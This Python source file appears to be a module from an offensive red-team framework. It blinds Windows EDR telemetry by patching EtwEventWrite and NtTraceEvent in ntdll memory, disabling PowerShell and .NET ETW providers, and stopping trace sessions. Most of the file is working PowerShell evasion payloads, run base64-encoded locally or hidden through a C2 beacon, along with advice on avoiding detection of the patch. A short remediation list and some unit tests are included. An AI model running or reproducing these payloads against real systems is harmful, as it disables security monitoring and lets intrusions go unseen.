"""ETW Blind — Patch Event Tracing for Windows to blind EDR telemetry.

Patches EtwEventWrite in ntdll.dll to prevent security telemetry
from being generated, effectively blinding EDR products that rely
on ETW for .NET, PowerShell, and threat intelligence events.

Bypass chain:
    ┌──────────┐  patch    ┌──────────┐  blocked  ┌──────────┐
    │ ntdll    │ ────────► │ EtwEvent │ ────────► │ EDR gets │
    │ .dll     │  in-mem   │ Write()  │  no data  │ no events│
    │          │           │ (ret 0)  │           │ BLIND 🙈 │
    └──────────┘           └──────────┘           └──────────┘

Techniques:
    1. EtwEventWrite patch — xor eax,eax; ret
    2. NtTraceEvent patch — same pattern at kernel boundary
    3. ETW provider unregister — kill specific providers
    4. ETW session manipulation — disable trace sessions
    5. .NET ETW bypass — disable CLR ETW provider

OPSEC: ETW patching is itself sometimes monitored. Some EDR
       products verify ntdll integrity. Use fresh ntdll mapping
       technique to avoid detection of the patch itself.

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import base64
import logging
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

log = logging.getLogger("forge.rootkit.etw_blind")

CVSS_EVASION = "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"
CVSS40_EVASION = "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"

# Known ETW providers targeted by EDR
EDR_ETW_PROVIDERS = {
    "Microsoft-Windows-Threat-Intelligence":
        "{F4E1897A-BB5D-5668-F1D8-040F4D8DD344}",
    "Microsoft-Windows-DotNETRuntime":
        "{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}",
    "Microsoft-Windows-PowerShell":
        "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
    "Microsoft-Antimalware-Scan-Interface":
        "{2A576B87-09A7-520E-C21A-4942F0271D67}",
    "Microsoft-Windows-WMI-Activity":
        "{1418EF04-B0B4-4623-BF7E-D74AB47BBDAA}",
}


@dataclass
class ETWBlindAction:
    """An ETW blinding action."""
    technique: str = ""
    provider: str = ""
    status: str = "pending"
    output: str = ""
    error: str = ""


class ETWBlind(BaseModule):
    """ETW blinding via in-memory patching.

    Patches Event Tracing for Windows functions to prevent
    security telemetry from being generated, blinding EDR
    products that rely on ETW providers.

    Techniques:
        - EtwEventWrite patch: xor eax,eax; ret (return 0)
        - NtTraceEvent patch: same at syscall boundary
        - Provider unregister: EventUnregister specific providers
        - Session kill: Stop trace sessions
        - .NET CLR provider: Disable runtime ETW

    Targeted providers:
        - Threat Intelligence (TI): Process/thread/image events
        - .NET Runtime: Assembly load, JIT, GC events
        - PowerShell: Script block, module logging
        - AMSI: Antimalware scan results
        - WMI Activity: WMI operation tracking
    """

    NAME        = "etw_blind"
    DESCRIPTION = "Evasion: ETW Blind — patch ETW to blind EDR telemetry"
    PHASE       = 10  # Evasion phase
    TAGS        = [
        "post-exploit", "evasion", "etw", "bypass",
        "defense-evasion", "edr-bypass",
        "mitre-T1562.006", "cwe-693",
    ]

    def __init__(self, *args: Any, **kwargs: Any) -> None:
        super().__init__(*args, **kwargs)
        self._actions: list[ETWBlindAction] = []

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        if not self.confirm_action(
            action="ETW blinding",
            target=target,
            risk="medium — patches ntdll.dll EtwEventWrite in memory. "
                 "Blinds EDR telemetry. Some EDR verify ntdll integrity.",
        ):
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        await self.rate_limit()

        technique = self.config.extra.get("etw_technique", "auto")
        target_providers = self.config.extra.get("etw_providers", ["all"])
        beacon_id = self.config.extra.get("beacon_id", "")
        attack_chain = self.config.extra.get("attack_chain", None)

        # ── Execute ETW bypass ────────────────────────────────────────
        if technique == "auto":
            for tech in ["etw_event_write", "nt_trace_event", "provider_unregister"]:
                action = await self._execute_bypass(tech, beacon_id)
                self._actions.append(action)
                if action.status == "success":
                    break
        else:
            action = await self._execute_bypass(technique, beacon_id)
            self._actions.append(action)

        # ── Disable specific providers if requested ───────────────────
        if "all" not in target_providers:
            for provider in target_providers:
                if provider in EDR_ETW_PROVIDERS:
                    action = await self._unregister_provider(
                        provider, EDR_ETW_PROVIDERS[provider], beacon_id,
                    )
                    self._actions.append(action)

        # ── Report ────────────────────────────────────────────────────
        successful = [a for a in self._actions if a.status == "success"]
        if successful:
            ev = Evidence(extra={
                "techniques": [a.technique for a in successful],
                "providers_blinded": [a.provider for a in successful if a.provider],
                "all_attempts": [
                    {"technique": a.technique, "status": a.status}
                    for a in self._actions
                ],
            })

            self.new_finding(
                title=f"ETW Blinded — {len(successful)} Technique(s) Applied",
                severity=Severity.HIGH,
                description=(
                    f"Successfully blinded ETW telemetry on {target}:\n\n"
                    + "\n".join(
                        f"  ✅ {a.technique}" + (f" ({a.provider})" if a.provider else "")
                        for a in successful
                    )
                    + "\n\nEDR products relying on ETW will receive no events.\n"
                    "This affects: Process creation, .NET assembly loading,\n"
                    "PowerShell script block logging, and WMI activity."
                ),
                reproduction_steps=[
                    "# Patch EtwEventWrite:",
                    "$ntdll = [System.Runtime.InteropServices.Marshal]::"
                    "GetHINSTANCE([AppDomain]::CurrentDomain.GetAssemblies() | "
                    "? {$_.Location -match 'mscorlib'}).Handle",
                    "# Or use C: patch ntdll!EtwEventWrite with xor eax,eax; ret",
                ],
                remediation=(
                    "1. Deploy EDR with ntdll integrity checking\n"
                    "2. Monitor for in-memory ntdll modifications\n"
                    "3. Use kernel-mode ETW consumers (harder to blind)\n"
                    "4. Implement ETW tamper detection\n"
                    "5. Enable Sysmon for supplemental telemetry"
                ),
                references=[
                    "MITRE T1562.006 — Impair Defenses: Indicator Blocking",
                ],
                evidence=ev,
                cvss_v31_vector=CVSS_EVASION,
                cvss_v40_vector=CVSS40_EVASION,
                mitre_attack=["TA0005/T1562.006"],
                target=target,
            )

        if attack_chain:
            for finding in self.findings:
                try:
                    attack_chain.ingest_finding(finding.to_dict())
                except Exception:
                    pass

        return self._make_result(start)

    # ── ETW bypass techniques ─────────────────────────────────────────

    async def _execute_bypass(self, technique: str, beacon_id: str) -> ETWBlindAction:
        """Execute an ETW bypass technique."""
        action = ETWBlindAction(technique=technique)

        script_map = {
            "etw_event_write": self._patch_etw_event_write,
            "nt_trace_event": self._patch_nt_trace_event,
            "provider_unregister": self._unregister_all_providers,
            "clr_etw": self._disable_clr_etw,
            "session_kill": self._kill_trace_sessions,
        }

        script_fn = script_map.get(technique, self._patch_etw_event_write)
        script = script_fn()

        encoded = base64.b64encode(script.encode("utf-16-le")).decode()
        cmd = f"powershell.exe -NoProfile -EncodedCommand {encoded}"

        output = await self._exec(cmd, beacon_id)

        if "ETW_BLIND_OK" in output:
            action.status = "success"
            action.output = output
        else:
            action.status = "failed"
            action.error = output[:200]

        return action

    def _patch_etw_event_write(self) -> str:
        """Patch EtwEventWrite to return 0 (success, no event written)."""
        return """
$ErrorActionPreference = 'Stop'
try {
    Add-Type @'
    using System;
    using System.Runtime.InteropServices;
    public class EtwPatch {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);
    }
'@

    $ntdll = [EtwPatch]::GetModuleHandle("ntdll.dll")
    $etwAddr = [EtwPatch]::GetProcAddress($ntdll, "EtwEventWrite")

    $oldProtect = 0
    [EtwPatch]::VirtualProtect($etwAddr, [UIntPtr]3, 0x40, [ref]$oldProtect)

    # Patch: xor eax, eax; ret (0x33 0xC0 0xC3) — returns STATUS_SUCCESS
    $patch = [byte[]] @(0x33, 0xC0, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $etwAddr, 3)

    [EtwPatch]::VirtualProtect($etwAddr, [UIntPtr]3, $oldProtect, [ref]$oldProtect)

    Write-Output 'ETW_BLIND_OK: EtwEventWrite patched (xor eax,eax; ret)'
} catch {
    Write-Output "ETW_BLIND_FAIL: $_"
}
"""

    def _patch_nt_trace_event(self) -> str:
        """Patch NtTraceEvent at syscall boundary."""
        return """
try {
    Add-Type @'
    using System;
    using System.Runtime.InteropServices;
    public class NtPatch {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);
    }
'@

    $ntdll = [NtPatch]::GetModuleHandle("ntdll.dll")
    $addr = [NtPatch]::GetProcAddress($ntdll, "NtTraceEvent")

    if ($addr -ne [IntPtr]::Zero) {
        $oldProtect = 0
        [NtPatch]::VirtualProtect($addr, [UIntPtr]3, 0x40, [ref]$oldProtect)
        $patch = [byte[]] @(0x33, 0xC0, 0xC3)
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 3)
        [NtPatch]::VirtualProtect($addr, [UIntPtr]3, $oldProtect, [ref]$oldProtect)
        Write-Output 'ETW_BLIND_OK: NtTraceEvent patched'
    } else {
        Write-Output 'ETW_BLIND_FAIL: NtTraceEvent not found'
    }
} catch {
    Write-Output "ETW_BLIND_FAIL: $_"
}
"""

    def _unregister_all_providers(self) -> str:
        """Unregister known EDR ETW providers."""
        return """
try {
    # Disable ETW for this process by setting environment variables
    $env:COMPlus_ETWEnabled = '0'
    $env:COMPlus_ETWFlags = '0'

    # Also patch EtwEventWrite as backup
    $a = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if ($a) {
        $f = $a.GetField('etwProvider','NonPublic,Static')
        if ($f) {
            $provider = $f.GetValue($null)
            if ($provider) {
                $ef = $provider.GetType().GetField('m_enabled','NonPublic,Instance')
                if ($ef) { $ef.SetValue($provider, 0) }
            }
        }
    }

    Write-Output 'ETW_BLIND_OK: Providers disabled via reflection'
} catch {
    Write-Output "ETW_BLIND_FAIL: $_"
}
"""

    def _disable_clr_etw(self) -> str:
        """Disable .NET CLR ETW provider."""
        return """
try {
    $env:COMPlus_ETWEnabled = '0'
    $env:COMPlus_PerfMapEnabled = '0'
    Write-Output 'ETW_BLIND_OK: CLR ETW disabled via environment'
} catch {
    Write-Output "ETW_BLIND_FAIL: $_"
}
"""

    def _kill_trace_sessions(self) -> str:
        """Stop active ETW trace sessions."""
        return r"""
try {
    # List and stop trace sessions
    $sessions = logman query -ets 2>$null
    $count = 0
    foreach ($line in $sessions) {
        if ($line -match '^\s*(\S+)\s+(Running|Enabled)') {
            $name = $Matches[1]
            if ($name -notmatch 'Circular|WPR') {
                logman stop $name -ets 2>$null
                $count++
            }
        }
    }
    Write-Output "ETW_BLIND_OK: Stopped $count trace sessions"
} catch {
    Write-Output "ETW_BLIND_FAIL: $_"
}
"""

    async def _unregister_provider(
        self, name: str, guid: str, beacon_id: str,
    ) -> ETWBlindAction:
        """Unregister a specific ETW provider."""
        action = ETWBlindAction(technique="provider_unregister", provider=name)

        script = f"""
try {{
    # Attempt to stop sessions consuming this provider
    logman stop "{name}" -ets 2>$null
    Write-Output "ETW_BLIND_OK: Provider {name} session stopped"
}} catch {{
    Write-Output "ETW_BLIND_FAIL: $($_.Exception.Message)"
}}
"""
        encoded = base64.b64encode(script.encode("utf-16-le")).decode()
        cmd = f"powershell.exe -NoProfile -EncodedCommand {encoded}"
        output = await self._exec(cmd, beacon_id)

        action.status = "success" if "ETW_BLIND_OK" in output else "failed"
        action.output = output if action.status == "success" else ""
        action.error = output[:200] if action.status == "failed" else ""
        return action

    async def _exec(self, cmd: str, beacon_id: str) -> str:
        """Execute command locally or via C2."""
        if beacon_id:
            try:
                from forge_c2.tasks.task_shell import ShellTask
                task = ShellTask(
                    task_id=f"etw_{beacon_id[:8]}",
                    command=cmd, timeout=10, hidden=True,
                )
                result = await task.execute()
                return result.output or ""
            except ImportError:
                pass

        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10.0)
            return stdout.decode(errors="replace") + stderr.decode(errors="replace")
        except Exception as exc:
            return f"ERROR: {exc}"


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestETWBlind:
    """Tests for ETWBlind module."""

    def test_phase(self) -> None:
        assert ETWBlind.PHASE == 10

    def test_tags(self) -> None:
        assert "etw" in ETWBlind.TAGS
        assert "mitre-T1562.006" in ETWBlind.TAGS

    def test_providers_defined(self) -> None:
        assert "Microsoft-Windows-Threat-Intelligence" in EDR_ETW_PROVIDERS
        assert "Microsoft-Windows-PowerShell" in EDR_ETW_PROVIDERS
        assert len(EDR_ETW_PROVIDERS) >= 5

    def test_patch_scripts(self) -> None:
        mod = ETWBlind.__new__(ETWBlind)
        assert "EtwEventWrite" in mod._patch_etw_event_write()
        assert "NtTraceEvent" in mod._patch_nt_trace_event()
        assert "COMPlus_ETWEnabled" in mod._disable_clr_etw()

    def test_etw_action_defaults(self) -> None:
        a = ETWBlindAction(technique="test")
        assert a.status == "pending"
